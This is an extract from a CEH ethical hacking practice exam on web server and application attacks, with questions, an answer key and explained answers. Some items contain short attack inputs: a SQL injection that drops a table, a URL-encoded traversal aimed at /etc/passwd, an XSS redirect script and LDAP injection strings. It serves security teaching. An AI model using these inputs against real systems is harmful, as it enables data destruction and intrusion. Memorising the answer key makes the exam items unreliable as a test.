All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

CHAPTER

Web-Based Hacking: 6
Servers and Applications
This chapter includes questions from the following topics:

• Identify features of common web server architectures
• Identify web application functions and architecture points
• Describe web server and web application attacks
• Identify web server and application vulnerabilities
• Identify web application hacking tools

In the spring of 1863, a mismatch was shaping up on the battlefield. General Robert E. Lee and
Stonewall Jackson had amassed a sizeable Confederate force of around 60,000 men in and around
Chancellorsville, Virginia, after the recent victory in Fredericksburg. Major General Joseph
Hooker, however, commanded a Union army of around 130,000 men and was under direct orders
from President Lincoln to destroy the Confederate army. He thus decided upon a plan of action,
grounded in the current military strategy, to apply his vastly larger forces and march against the
enemy. By any measure, this was shaping up as an easy victory for the North.

General Lee, however, wasn’t well known for following the strict rules of battle. While Hooker
amassed forces for a front-on attack, Lee did something that, at the time, was unprecedented: he
split his already outnumbered army into three groups. He left a paltry 10,000 men to meet the
head-on charge, but sent the other 50,000 men in two groups to surround and flank the Union
troops. Through a series of improbable victories on the Confederate side and utterly tentative and
puzzling decision-making by their Northern counterparts, the battle became a treatise on victory
against all odds as well as the power of mind and strategy on the battlefield.

And what is the relevance here for us, you may ask? By changing the focus of his attack,
General Lee succeeded in pulling off one of the most unexpected military victories in history. You
can do the same in your pen testing by focusing your efforts on those areas the strong defenses
of your target may overlook: their web applications and servers (yes, I know it’s corny, but just
go with it). Businesses and corporations are like that Union army, with so many defenses arrayed
against you they seem impenetrable. But most of them can be outflanked, via their public-facing
web fronts (which may or may not have proper security included) and their customized, internal
web applications. This chapter is all about web servers and applications and how you can exploit
them. After all, if the target is going to trust them, why not have a look?

137

06-ch06.indd 137 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

STUDY TIPS Web server and application hacking makes up a full 16 percent
of your exam, so it should obviously warrant a significant amount of your
study effort. I wish I could tell you memorization of terminology and key
words would be enough to make it through these questions, but that’s

simply not the case anymore. ECC wants to make sure you know web servers and
applications thoroughly, so they’ve upped the ante in question offerings. Some will be
more in the form of a scenario where you may need to pull from multiple areas of study in
order to derive the correct answer. A couple of very specific questions may even involve
scripting and will appear really difficult; however, if you simply remember protocols,
ports, and basic networking, you can usually work your way through them.

Know your attacks well, including CSRF, CSPP, HTTP response splitting, and of course
XSS, SQL injection, and URL tampering (among all the others). Be sure to spend some
time in HTTP, and know it well. Another must-know for the exam is OWASP—know what
it is, what it does, and its Top 10 lists well.

CEH Certified Ethical Hacker Practice Exams

138

06-ch06.indd 138 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

QUESTIONS

1. In Nmap, the http-methods script can be used to test for potentially risky HTTP options Q
supported by a target. Which of the following methods would be considered risky per
the script?

A. CONNECT

B. GET

C. POST

D. HEAD

2. Bob is notified of what appears to be a denial-of-service attack against a system in his
environment. On investigation, Bob discovers the target system is receiving overwhelming
numbers of DNS responses for an IP resolution. Which of the following is the most
likely attack?

A. DNS amplification

B. DNS server hijacking

C. SSRF

D. Metasploit NOPS module

3. A web application developer wants to test a new application for security flaws. Which of
the following is a method of testing input variations by using randomly generated invalid
input in an attempt to crash the program?

A. Insploit

B. Finglonger

C. Metasplation

D. Fuzzing

4. Which of the following uses HTML entities properly to represent <script>?

A. &lt;script&gt;

B. &#40;script&#41;

C. &amp;script&amp;

D. &quot;script&quot;

5. An attacker tricks a user into visiting a malicious website via a phishing e-mail. The
user clicks the e-mail link and visits the malicious website while maintaining an active,
authenticated session with his bank. The attacker, through the malicious website, then
instructs the user’s web browser to send requests to the bank website. Which of the
following best describes this attack?

A. CSPP

B. XSS

C. CSRF

D. Hidden form field

Chapter 6: Web-Based Hacking: Servers and Applications

139

06-ch06.indd 139 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

6. Which of the following is used by SOAP services to format information?

A. Unicode

B. HTML entities

C. NTFS

D. XML

7. A web application developer is discussing security flaws discovered in a new application
prior to production release. He suggests to the team that they modify the software to
ensure users are not allowed to enter HTML as input into the application. Which of the
following is most likely the vulnerability the developer is attempting to mitigate against?

A. Cross-site scripting

B. Cross-site request forgery

C. Connection string parameter pollution

D. Phishing

8. Which of the following is a common SOA vulnerability?

A. SQL injection

B. XSS

C. XML denial of service

D. CGI manipulation

9. The source code of software used by your client seems to have a large number of
gets() alongside sparsely used fgets(). What kind of attack is this software potentially
susceptible to?

A. SQL injection

B. Buffer overflow

C. Parameter tampering

D. Cookie manipulation

10. Which of the following would be the best choice in the prevention of XSS?

A. Challenge tokens

B. Memory use controls

C. HttpOnly flag in cookies

D. Removing hidden form fields

11. You are examining log files and come across this URL:
http://www.example.com/script.ext?template%2e%2e%2e%2e%2e%2f%2e%2f%65%
74%63%2f%70%61%73%73%77%64

CEH Certified Ethical Hacker Practice Exams

140

06-ch06.indd 140 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

Which of the following best describes this potential attack?

A. This is not an attack but a return of SSL handshakes.

B. An attacker appears to be using Unicode.

C. This appears to be a buffer overflow attempt.

D. This appears to be an XSS attempt.

12. Which MSFconsole command allows you to connect to a host from within the console?

A. pivot

B. connect

C. get

D. route

13. Which character is your best option in testing for SQL injection vulnerability?

A. The @ symbol

B. A double dash

C. The + sign

D. A single quote

14. An angry former employee of the organization discovers a web form vulnerable to SQL
injection. Using the injection string SELECT * FROM Orders_Pend WHERE Location_
City = 'Orlando', he is able to see all pending orders from Orlando. If he wanted to delete
the Orders_Pend table altogether, which SQL injection string should he use?

A. SELECT * FROM Orders_Pend WHERE Location_City = Orlando';DROP TABLE
Orders_Pend --

B. SELECT * FROM Orders_Pend WHERE 'Orlando';DROP_TABLE --

C. DROP TABLE Orders_Pend WHERE 'Orlando = 1' --

D. WHERE Location_City = Orlando'1 = 1': DROP_TABLE --

15. Efforts to gain information from a target website have produced the following error message:
Microsoft OLE DB Provider for ODBC Drivers error '80040e08'
[Microsoft]{OBDC SQL Server Driver}

Which of the following best describes the error message?

A. The site may be vulnerable to XSS.

B. The site may be vulnerable to buffer overflow.

C. The site may be vulnerable to SQL injection.

D. The site may be vulnerable to a malware injection.

Chapter 6: Web-Based Hacking: Servers and Applications

141

06-ch06.indd 141 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

16. An attacker discovers a legitimate username (user1) and enters the following into a web
form authentication window:

Which of the following attacks is most likely being attempted?

A. SQL injection

B. LDAP injection

C. URL tampering

D. DHCP amplification

17. Which of the following is a standard method for web servers to pass a user’s request to an
application and receive data back to forward to the user?

A. SSI

B. SSL

C. CGI

D. CSI

18. An attacker performs a SQL injection attack but receives nothing in return. She then
proceeds to send multiple SQL queries, soliciting TRUE or FALSE responses. Which
attack is being carried out?

A. Blind SQL injection

B. SQL denial of service

C. SQL code manipulation

D. SQL replay

19. A tester is attempting a CSPP attack. Which of the following is she most likely to use in
conjunction with the attack?

A. ;

B. :

C. ‘

CEH Certified Ethical Hacker Practice Exams

142

06-ch06.indd 142 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

D. “

E. --

F. ~

20. An attacker is attempting to elevate privileges on a machine by using Java or other
functions, through nonvalidated input, to cause the server to execute a malicious piece of
code and provide command-line access. Which of the following best describes this action?

A. Shell injection

B. File injection

C. SQL injection

D. URL injection

21. An attacker is successful in using a cookie, stolen during an XSS attack, during an invalid
session on the server by forcing a web application to act on the cookie’s contents. How is
this possible?

A. A cookie can be replayed at any time, no matter the circumstances.

B. Encryption was accomplished at the Application layer, using a single key.

C. Authentication was accomplished using XML.

D. Encryption was accomplished at the Network layer.

22. HTML forms include several methods for transferring data back and forth. Inside a form,
which of the following encodes the input into the Uniform Resource Identifier (URI)?

A. HEAD

B. PUT

C. GET

D. POST

23. An attacker is looking at a target website and is viewing an account from the store on
URL http://www.anybiz.com/store.php?id=2. He next enters the following URL:
http://www.anybiz.com/store.php?id=2 and 1=1

The web page loads normally. He then enters the following URL:
http://www.anybiz.com/store.php?id=2 and 1=2

A generic page noting “An error has occurred” appears.

Which of the following is a correct statement concerning these actions?

A. The site is vulnerable to cross-site scripting.

B. The site is vulnerable to blind SQL injection.

C. The site is vulnerable to buffer overflows.

D. The site is not vulnerable to SQL injection.

Chapter 6: Web-Based Hacking: Servers and Applications

143

06-ch06.indd 143 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

24. Which of the following statements is not true regarding WebGoat?

A. WebGoat is maintained and made available by OWASP.

B. WebGoat can be installed on Windows systems only.

C. WebGoat is based on a black-box testing mentality.

D. WebGoat can use Java or .NET.

25. An attacker is viewing a blog entry showing a news story and asking for comments. In the
comment field, the attacker enters the following:
Nice post and a fun read
<script>onload=window.location='http://www.badsite.com'</script>

What is the attacker attempting to perform?

A. A SQL injection attack against the blog’s underlying database

B. A cross-site scripting attack

C. A buffer overflow DoS attack

D. A file injection DoS attack

26. Which of the following is one of the most common methods for an attacker to exploit
the Shellshock vulnerability?

A. SSH brute force

B. CSRF

C. Form field entry manipulation

D. Through web servers utilizing CGI (Common Gateway Interface)

27. You are examining website files and find the following text file:
# robots.txt for http://www.anybiz.com/
User-agent: Googlebot
Disallow: /tmp/
User-agent: *
Disallow: /
Disallow: /private.php
Disallow: /listing.html

Which of the following is a true statement concerning this file?

A. All web crawlers are prevented from indexing the listing.html page.

B. All web crawlers are prevented from indexing all pages on the site.

C. The Googlebot crawler is allowed to index pages starting with /tmp/.

D. The Googlebot crawler can access and index everything on the site except for pages
starting with /tmp/.

CEH Certified Ethical Hacker Practice Exams

144

06-ch06.indd 144 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

QUICK ANSWER KEY

1. A 10. C 19. A

2. A 11. B 20. A

3. D 12. B 21. B

4. A 13. D 22. C

5. C 14. A 23. B

6. D 15. C 24. B

7. A 16. B 25. B

8. C 17. C 26. D

9. B 18. A 27. D

Chapter 6: Web-Based Hacking: Servers and Applications

145

06-ch06.indd 145 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

ANSWERS

A 1. In Nmap, the http-methods script can be used to test for potentially risky HTTP options
supported by a target. Which of the following methods would be considered risky per
the script?

A. CONNECT

B. GET

C. POST

D. HEAD

☑ A. The http-methods script usage syntax is nmap --script http-methods <target>,
where <target> is the IP of the system you’re after. Per Nmap’s support pages
(https://nmap.org/nsedoc/scripts/http-methods.html), this script “finds out what
options are supported by an HTTP server by sending an OPTIONS request and lists
potentially risky methods. It tests those methods not mentioned in the OPTIONS
headers individually and sees if they are implemented. Any output other than
501/405 suggests that the method is not in the range 400 to 600. If the response
falls under that range then it is compared to the response from a randomly generated
method. In this script, ‘potentially risky’ methods are anything except GET, HEAD,
POST, and OPTIONS. If the script reports potentially risky methods, they may not
all be security risks, but you should check to make sure.” You can also use additional
parameters, such as url-path, to further hone your results. For example, output from
the preceding syntax showing PUT as a risky method might look like this:
PORT STATE SERVICE REASON
80/tcp open http syn-ack
| http-methods:
|_ Supported Methods: GET PUT HEAD POST OPTIONS
.....

Quite obviously, there is a lot of information tested in this one question—and many,
many ways you might see it on the exam. The HTTP options themselves will show
up somewhere, so knowing the difference, for example, between HTTP POST
(submits data to be processed and is normally allowable) and HTTP PUT (allows a
client to upload new files on the web server, which normally shouldn’t be allowed)
will become very important to your success. According to OWASP, the following
options are important to know:

• PUT This method allows a client to upload new files on the web server. An
attacker can exploit it by uploading malicious files (for example, an .asp file that
executes commands by invoking cmd.exe) or by simply using the victim’s server
as a file repository.

• DELETE This method allows a client to delete a file on the web server. An
attacker can exploit it as a very simple and direct way to deface a website or to
mount a DoS attack.

CEH Certified Ethical Hacker Practice Exams

146

06-ch06.indd 146 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

• CONNECT This method could allow a client to use the web server as a proxy.

• TRACE This method simply echoes back to the client whatever string has
been sent to the server, and it’s used mainly for debugging purposes. This method,
originally assumed harmless, can be used to mount an attack known as
cross-site tracing.

☐✗ B, C, and D are incorrect because these are not considered “risky” options.

2. Bob is notified of what appears to be a denial-of-service attack against a system in his
environment. On investigation, Bob discovers the target system is receiving overwhelming
numbers of DNS responses for an IP resolution. Which of the following is the most
likely attack?

A. DNS amplification

B. DNS server hijacking

C. SSRF

D. Metasploit NOPS module

A. A DNS amplification attack is exactly what it sounds like: an attacker takes
advantage of recursive DNS to flood a target with DNS responses. Basically, the
bad guy sets up a botnet and, when ready to go, has the zombie systems send DNS
resolution requests as if they came from the target. DNS does what it’s supposed to
do, and the target is flooded with DNS responses.

☐✗ B is incorrect because DNS server hijacking refers to an attack where the bad guy
actually compromises a DNS server and routes all responses to malicious sites instead
of the original DNS entries.

☐✗ C is incorrect because in a server-side request forgery (SSRF) attack, the malicious
actor bypasses restricted access to internal servers by having a public-facing server
send the requests for him; the internal server responds due to trusting the public-
facing server, and the attacker gains data.

☐✗ D is incorrect because Metasploit’s NOPS module isn’t necessary an attack in and
of itself. It’s a method within Metasploit to generate no-operation instructions for
blocking out buffers.

3. A web application developer wants to test a new application for security flaws. Which of
the following is a method of testing input variations by using randomly generated invalid
input in an attempt to crash the program?

A. Insploit

B. Finglonger

C. Metasplation

D. Fuzzing

Chapter 6: Web-Based Hacking: Servers and Applications

147

06-ch06.indd 147 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☑ D. Even if you didn’t know what “fuzzing” meant, you probably could’ve whittled
this down by eliminating the known wrong answers. Per OWASP (https://www
.owasp.org/index.php/Fuzzing), “Fuzz testing or fuzzing is a Black Box software
testing technique, which basically consists in finding implementation bugs using
malformed/semi-malformed data injection in an automated fashion.” In other words,
fuzzing sends tons of weird inputs into fields to see what the application will do.

As an aside, you would find fuzzing in the Verification phase of Microsoft’s Security
Development Lifecycle (SDL). The entire SDL consists of training, requirements,
design, implementation, verification, release, and response. As a quick aside, fuzzing
isn’t necessarily a “random” process—it’s more an effort of controlled chaos.

☐✗ A, B, and C are incorrect because none of these are legitimate terms as far as testing
is concerned. Insploit and Metasplation are not real terms. Finglonger isn’t either–at
least in regards to what we’re talking about in this question anyway–but it did make
an appearance in a fantastic episode of Futurama.

4. Which of the following uses HTML entities properly to represent <script>?

A. &lt;script&gt;

B. &#40;script&#41;

C. &amp;script&amp;

D. &quot;script&quot;

☑ A. Cross-site scripting generally relies on web pages not properly validating user
input, and HTML entities can be used to take the place of certain characters. In this
case, the less-than sign (<) and the greater-than sign (>) surround the word script.
Respectively, the appropriate HTML entities are &lt; and &gt; (the lt and gt should
give this away).

☐✗ B is incorrect because &#40; and &#41; stand for the open and close parentheses,
respectively. For example, (hello) would read &#40;hello&#41; using HTML entities.

☐✗ C is incorrect because &amp; stands for the ampersand character (&).

☐✗ D is incorrect because &quot; stands for the quote character (“).

5. An attacker tricks a user into visiting a malicious website via a phishing e-mail. The
user clicks the e-mail link and visits the malicious website while maintaining an active,
authenticated session with his bank. The attacker, through the malicious website, then
instructs the user’s web browser to send requests to the bank website. Which of the
following best describes this attack?

A. CSPP

B. XSS

C. CSRF

D. Hidden form field

CEH Certified Ethical Hacker Practice Exams

148

06-ch06.indd 148 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☑ C. There are few guarantees in life, but here’s one: you will definitely be asked about
cross-site request forgery (CSRF) on your exam. A CSRF attack is exactly what’s
being described here—an attacker takes advantage of an open, active, authenticated
session between the victim and a trusted site, sending message requests to the
trusted site as if they are coming from the victim’s own browser. Usually this involves
phishing, or maybe an advertisement, but the principle is always the same. CSRF
attacks can be prevented by configuring random challenge tokens, which allow the
server to verify user requests.

As an aside, a similar attack is known as session fixation. The attacker logs into a
legitimate site, pulls a session ID, and then sends an e-mail with a link containing
the fixed session ID. When the user clicks it and logs in to the same legitimate site, the
hacker then logs in and runs with the user’s credentials.

☐✗ A is incorrect because the question does not describe a connection string parameter
pollution (CSPP) attack. A CSPP attack exploits web applications that use
semicolons to separate parameters during communications.

☐✗ B is incorrect because the question does not describe a cross-site scripting (XSS)
attack. An XSS attack attempts to interject a script into input fields.

☐✗ D is incorrect because a hidden form field attack occurs when an attacker
manipulates the values of a hidden form field and resubmits them to the server.

6. Which of the following is used by SOAP services to format information?

A. Unicode

B. HTML entities

C. NTFS

D. XML

☑ D. Simple Object Access Protocol (SOAP) is a protocol designed for exchanging
structured information within web services across multiple variant systems. In other
words, it’s a way for a program running in one kind of operating system (let’s say
Windows Server 2019 or 2020) to communicate with a program on another (such
as Linux). It uses HTTP and XML to exchange information and specifies how to
encode HTTP headers and XML files so that applications can talk to each other.
One great advantage to this is also a great detriment, security-wise: because HTTP
is generally allowed through most firewalls, applications using SOAP can generally
communicate at will throughout networks.

SOAP injection attacks allow you to inject malicious query strings (much like SQL
injection, as a matter of fact) that might give you the means to bypass authentication
and access databases behind the scenes. SOAP is compatible with HTTP and SMTP,
and messages are typically one-way in nature.

☐✗ A is incorrect because Unicode is not used by SOAP in this manner. It’s a standard
for representing text in computing.

Chapter 6: Web-Based Hacking: Servers and Applications

149

06-ch06.indd 149 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☐✗ B is incorrect because HTML entities are not used by SOAP in this manner. They’re
used to represent characters in HTML code.

☐✗ C is incorrect because NTFS is a file system and has nothing to do with SOAP.

7. A web application developer is discussing security flaws discovered in a new application
prior to production release. He suggests to the team that they modify the software to
ensure users are not allowed to enter HTML as input into the application. Which of the
following is most likely the vulnerability the developer is attempting to mitigate against?

A. Cross-site scripting

B. Cross-site request forgery

C. Connection string parameter pollution

D. Phishing

☑ A. XSS flaws occur whenever an application takes untrusted data and sends it to a
web browser without proper validation or escaping. The basics of this attack revolve
around website design (or web application design on that site), dynamic content,
and invalidated input data. Usually when a web form pops up, the user inputs
something, and then some script dynamically changes the appearance or behavior
of the website based on what has been entered. XSS occurs when the bad guys take
advantage of that scripting (Java, for instance) and have it perform something other
than the intended response. For example, suppose instead of entering what you’re
supposed to enter in a form field, you enter an actual script. The server then does
what it’s supposed to—it processes the code sent from an authorized user. The best
defense against this is proper design and good input validation before the app ever
sees production in the first place.

☐✗ B is incorrect because the fix action being suggested would not necessarily affect
CSRF attacks. In CSRF, an attacker takes advantage of an open, active, authenticated
session between the victim and a trusted site, sending message requests to the trusted
site as if they are from the victim’s own browser.

☐✗ C is incorrect because the fix action being suggested would not necessarily affect CSPP
attacks. A connection string parameter pollution attack exploits web applications that
use semicolons to separate parameters during communications.

☐✗ D is incorrect because the fix action being recommended would not necessarily affect
any social engineering effort.

8. Which of the following is a common SOA vulnerability?

A. SQL injection

B. XSS

C. XML denial of service

D. CGI manipulation

CEH Certified Ethical Hacker Practice Exams

150

06-ch06.indd 150 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☑ C. Service-oriented architecture (SOA) is a software design idea that is based on
specific pieces of software providing functionality as services between applications.
The idea is to define how two applications can interact so that one can perform a
piece of work for the other (or, better said, on behalf of the other). Each interaction
is independent of any other and is self-contained. SOA programmers make extensive
use of XML to carry all this out, and that leaves the application vulnerable to crafty
XML tampering. If an attacker can somehow pass an XML message with a large
payload, or any of a number of other bad content, they can perform an XML denial-
of-service attack on an SOA application. This isn’t to imply it’s the only type of DoS
available or that SOA is uniquely vulnerable (for instance, the only thing a specifically
crafted XML attack can affect). It’s just a question, so don’t read too much into it.

☐✗ A, B, and D are incorrect because these attacks don’t necessarily apply with SOA in
this context.

9. The source code of software used by your client seems to have a large number of
gets() alongside sparsely used fgets(). What kind of attack is this software potentially
susceptible to?

A. SQL injection

B. Buffer overflow

C. Parameter tampering

D. Cookie manipulation

☑ B. A buffer overflow is an attempt to write more data into an application’s prebuilt
buffer area in order to overwrite adjacent memory, execute code, or crash a system
(application). By inputting more data than the buffer is allocated to hold, you may
be able to crash the application or machine or alter the application’s data pointers.
gets() is a common source of buffer overflow vulnerabilities because it reads a line
from standard input into a buffer until a terminating EOF is found. It performs no
check for buffer overrun and has been largely replaced by fgets(). Also, technically
speaking, there is oftentimes no length to check for—it just writes until it reaches a
termination point.

☐✗ A is incorrect because SQL injection has nothing to do with this scenario. No evidence
is presented that this software even interacts with a database.

☐✗ C is incorrect because parameter tampering deals with manipulating a URL.

☐✗ D is incorrect because cookie manipulation has nothing to do with this software. A
cookie is a small text-based file used to provide a more consistent web experience for
a web visitor. Because it holds various information, though, it can be manipulated for
nefarious purposes (using the Firefox add-on Cookie Editor, for instance).

Chapter 6: Web-Based Hacking: Servers and Applications

151

06-ch06.indd 151 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

10. Which of the following would be the best choice in the prevention of XSS?

A. Challenge tokens

B. Memory use controls

C. HttpOnly flag in cookies

D. Removing hidden form fields

☑ C. In addition to input validation controls (always good for bunches of vulnerability
mitigations), setting the HttpOnly flag in cookies can be used in mitigation against some
XSS attacks. Cross-site scripting occurs when an attacker interjects code into a web page
form field that does not have appropriate input validation configured. The HttpOnly
cookie flag can stop any injected code from being accessible by a client-side script.

Per OWASP, if the HttpOnly flag is included in the HTTP response header, the
cookie cannot be accessed through client-side script. As a result, even if a cross-site
scripting flaw exists, and a user accidentally accesses a link that exploits this flaw, the
browser (primarily Internet Explorer) will not reveal the cookie to a third party.

☐✗ A is incorrect because challenge tokens are used in the mitigation of CSRF.

☐✗ B is incorrect because memory use control configurations wouldn’t necessarily affect
XSS vulnerabilities at all.

☐✗ D is incorrect because removing hidden form fields would not necessarily do
anything to mitigate XSS.

11. You are examining log files and come across this URL:
http://www.example.com/script.ext?template%2e%2e%2e%2e%2e%2f%2e%2f%65%
74%63%2f%70%61%73%73%77%64

Which of the following best describes this potential attack?

A. This is not an attack but a return of SSL handshakes.

B. An attacker appears to be using Unicode.

C. This appears to be a buffer overflow attempt.

D. This appears to be an XSS attempt.

☑ B. Unicode is just another way to represent text, so why not use it to try to get past
an IDS? Of course, in the real world, every IDS would probably be looking for weird
Unicode requests anyway (it isn’t ciphered or encrypted and really does nothing more
than provide a cursory obfuscation), but let’s just stick with EC-Council and the CEH
exam here for now. This request appears to be attempting a grab of some passwords:
%2e%2e%2f%2e%2e%2f%2e%2f% = ../../../
%65%74%63 = etc
%2f = /
%70%61%73%73%77%64 = passwd

☐✗ A, C, and D are all incorrect because this URL does not necessarily indicate any of
these attacks and is quite clearly a Unicode attempt.

CEH Certified Ethical Hacker Practice Exams

152

06-ch06.indd 152 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

12. Which MSFconsole command allows you to connect to a host from within the console?

A. pivot

B. connect

C. get

D. route

☑ B. Questions on Metasploit can be very generalized or—like this question—pretty
darn specific. MSFconsole, opened with the msfconsole command, is a common
method of interfacing with Metasploit. As put by Offensive Security, it provides an
“all-in-one” centralized console and allows you efficient access to virtually all of
the options available in the MSF, and it’s the only supported way to access most
of the features within Metasploit. Commands used in the interface are listed and
discussed pretty well on Offensive Security’s site (https://www.offensive-security.com/
metasploit-unleashed/msfconsole-commands/). The connect command acts like a
miniature netcat clone, supporting SSL, proxies, pivoting, and file sends. By issuing
the connect command with an IP address and port number, you can connect to a
remote host from within MSFconsole the same as you would with netcat or telnet.

In addition to MSFconsole, you should also know that the Metasploit architecture
holds five modules: Exploits, Payloads, Encoders, NOPS, and Auxiliary. Exploits
is the basic module, used to encapsulate (and configure behaviors for) an exploit.
Payloads establishes a communication channel between Metasploit and the target.
Auxiliary is used to run things like port scanning and fuzzing.

☐✗ A is incorrect because there is no pivot command in MSFconsole. Pivoting does refer to
connecting to other machines from a compromised system, but it’s not accomplished
with a pivot command.

☐✗ C is incorrect because the get command gets the value of a context-specific variable.

☐✗ D is incorrect because the route command is used to route traffic through a session
(and is generally seen, question-wise, in regard to pivoting).

13. Which character is your best option in testing for SQL injection vulnerability?

A. The @ symbol

B. A double dash

C. The + sign

D. A single quote

☑ D. SQL injection is all about entering queries and commands into a form field
(or URL) to elicit a response, gain information, or manipulate data. On a web page,
many times entries into a form field are inserted into a SQL command. When you
enter your username and information into the fields and click the button, the SQL
command in the background might read something like this:
SELECT OrderID, FirstName, Lastname FROM Orders

Chapter 6: Web-Based Hacking: Servers and Applications

153

06-ch06.indd 153 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

In SQL, a single quote is used to indicate an upcoming character string. Once SQL
sees that open quote, it starts parsing everything after it as string input. If there’s
no close quote, an error occurs because SQL doesn’t know what to do with the
submitted characters. If the web page is configured poorly, that error will return to
you and let you know it’s time to start injecting SQL commands.

☐✗ A, B, and C are incorrect characters to use as part of a SQL injection test. The @ symbol
is used to designate a variable in SQL (you’ll need to define the variable, of course).
The + sign is used to combine strings (as in Matt+Walker). A double dash indicates
an upcoming comment in the line.

14. An angry former employee of the organization discovers a web form vulnerable to
SQL injection. Using the injection string SELECT * FROM Orders_Pend WHERE
Location_City = 'Orlando', he is able to see all pending orders from Orlando. If he wanted
to delete the Orders_Pend table altogether, which SQL injection string should he use?

A. SELECT * FROM Orders_Pend WHERE Location_City = Orlando';DROP TABLE
Orders_Pend --

B. SELECT * FROM Orders_Pend WHERE 'Orlando';DROP_TABLE --

C. DROP TABLE Orders_Pend WHERE 'Orlando = 1' --

D. WHERE Location_City = Orlando'1 = 1': DROP_TABLE --

☑ A. SQL queries usually read pretty straightforward, although they can get
complicated rather quickly. In this case, you’re telling the database, “Can you check
the table Orders_Pend and see whether there’s a city called Orlando? Oh, by the way,
since you’re executing any command I send anyway, just go ahead and drop the table
called Orders_Pend while you’re at it.” The only thing missing from SQL queries is
a thank-you at the end. As an aside, you can easily restrict which SQL verbs any user
can make use of (through DDL and DMAL statements), and you should. Allowing
all users to drop tables and the like is akin to making your standard user a domain
administrator; it’s a rather dumb idea!

☐✗ B, C, and D are incorrect because they do not have proper syntax.

15. Efforts to gain information from a target website have produced the following error message:
Microsoft OLE DB Provider for ODBC Drivers error '80040e08'
[Microsoft]{OBDC SQL Server Driver}

Which of the following best describes the error message?

A. The site may be vulnerable to XSS.

B. The site may be vulnerable to buffer overflow.

C. The site may be vulnerable to SQL injection.

D. The site may be vulnerable to a malware injection.

CEH Certified Ethical Hacker Practice Exams

154

06-ch06.indd 154 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

☑ C. Once again, you will get a few “gimme” questions on the exam. The error message
clearly displays a SQL error, telling us there’s an underlying SQL database to contend
with and it’s most likely not configured correctly (or we wouldn’t be getting an error
message like this—through a web interface and telling us exactly what’s there—in the
first place).

☐✗ A, B, and D are all incorrect for the same reason: the error message simply doesn’t
provide enough information to make these leaps. There is nothing here indicating
cross-site scripting or buffer overflow on either side of the ledger. Although it’s true
the error may indicate which kinds of malware may increase your odds of success,
there’s nothing there to indicate, by itself, that the site is vulnerable.

16. An attacker discovers a legitimate username (user1) and enters the following into a web
form authentication window:

Which of the following attacks is most likely being attempted?

A. SQL injection

B. LDAP injection

C. URL tampering

D. DHCP amplification

☑ B. LDAP injection works a lot like SQL injection—you enter code that is passed
by the application to something behind it for processing. With LDAP injection,
if the input is not validated, you can enter direct LDAP queries into the form and
watch for results. In this case, the attacker logs in without any password. The actual
LDAP query from a legitimate login would have appeared like this: (&(user=user1)
(password=meh)). The addition of the )(&) characters turns the expression to
(&(user=user1)(&))(password=meh)), which processes only the username portion
of the query. And since that’s always true, the attacker is in.

Chapter 6: Web-Based Hacking: Servers and Applications

155

06-ch06.indd 155 22/04/22 9:53 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 6

LDAP injection questions may also center on the Boolean operators used in syntax.
The operators to remember are summarized in the following table:

Operator  Syntax

= (objectclass=user)

>= (mdbStorageQuota>=10000)

<= (mdbStorageQuota<=10000)

~= (displayName~=Jones)

* (displayName=*Jon*)

AND (&) (&(objectclass=user) (displayName=Jones)

OR (|) (|(objectclass=user) (displayName=Jones)

NOT (!) (!(objectclass=user) (displayName=Jones)

☐✗ A is incorrect because the scenario does not indicate a SQL injection attack. SQL
injection attempts make use of the open quote and SQL statements—for example,
test ‘) ;DROP TABLE Users;--.

☐✗ C is incorrect because the scenario does not show a URL tampering attack.

☐✗ D is incorrect because the scenario does not show a DHCP amplification attack.

17. Which of the following is a standard method for web servers to pass a user’s request to an
application and receive data back to forward to the user?

A. SSI

B. SSL

C. CGI

D. CSI

☑ C. Common Gateway Interface (CGI) is a standardized method for transferring
information between a web server and an executable (a CGI script is designed to
perform some task with the data). CGI is considered a server-side solution because
processing is done on the web server and not the client. Because CGI scripts can
run essentially arbitrary commands on your system with the permissions of the web
server user and because they are almost always wrapped so that a script will execute
as the owner of the script, they can be extremely dangerous if not carefully checked.
